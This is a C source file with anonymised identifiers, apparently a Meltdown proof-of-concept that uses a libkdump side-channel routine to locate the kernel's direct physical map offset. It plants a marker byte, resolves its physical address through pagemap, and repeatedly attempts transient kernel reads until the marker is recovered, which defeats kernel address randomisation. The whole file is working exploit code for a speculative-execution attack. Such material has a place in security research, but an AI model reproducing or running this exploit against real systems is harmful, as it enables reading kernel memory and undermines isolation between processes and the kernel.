
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {int retries; int measurements; } ;
typedef TYPE_1__ libkdump_config_t ;


 size_t VAR_0 ;
 int FUNC_0 (int) ;
 int FUNC_1 (int ) ;
 int FUNC_2 () ;
 int FUNC_3 (int ) ;
 TYPE_1__ FUNC_4 () ;
 int FUNC_5 (TYPE_1__) ;
 int FUNC_6 (size_t) ;
 size_t FUNC_7 (size_t) ;
 int FUNC_8 (char*,...) ;
 int VAR_1 ;

int FUNC_9(int VAR_2, char *VAR_3[]) {
  size_t VAR_4[4096];
  libkdump_config_t VAR_5;
  size_t VAR_6 = VAR_0;

  size_t VAR_7 = 0x800000000ll;



  size_t VAR_8 = -2 * VAR_7;
  int VAR_9 = 0;

  FUNC_3(0);

  VAR_5 = FUNC_4();
  VAR_5.retries = 10;
  VAR_5.measurements = 1;

  FUNC_5(VAR_5);

  size_t VAR_10 = (size_t)(VAR_4 + 2048);
  *(char *)VAR_10 = 'X';

  size_t VAR_11 = FUNC_7(VAR_10);
  if (!VAR_11) {
    FUNC_8("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    FUNC_0(1);
  }

  while (1) {
    *(volatile char *)VAR_10 = 'X';
    *(volatile char *)VAR_10 = 'X';
    *(volatile char *)VAR_10 = 'X';
    *(volatile char *)VAR_10 = 'X';
    *(volatile char *)VAR_10 = 'X';

    int VAR_12 = FUNC_6(VAR_11 + VAR_6 + VAR_8);
    if (VAR_12 == 'X') {
      FUNC_8("\r\x1b[32;1m[+]\x1b[0m Direct physical map offset: \x1b[33;1m0x%zx\x1b[0m\n", VAR_6 + VAR_8);
      FUNC_1(VAR_1);
      break;
    } else {
      VAR_8 += VAR_7;
      if (VAR_8 >= -1ull - VAR_6) {
        VAR_8 = 0;
        VAR_7 >>= 4;
      }
      FUNC_8("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(VAR_9++ / 400) % 4], VAR_6 + VAR_8);
    }
  }

  FUNC_2();

  return 0;
}
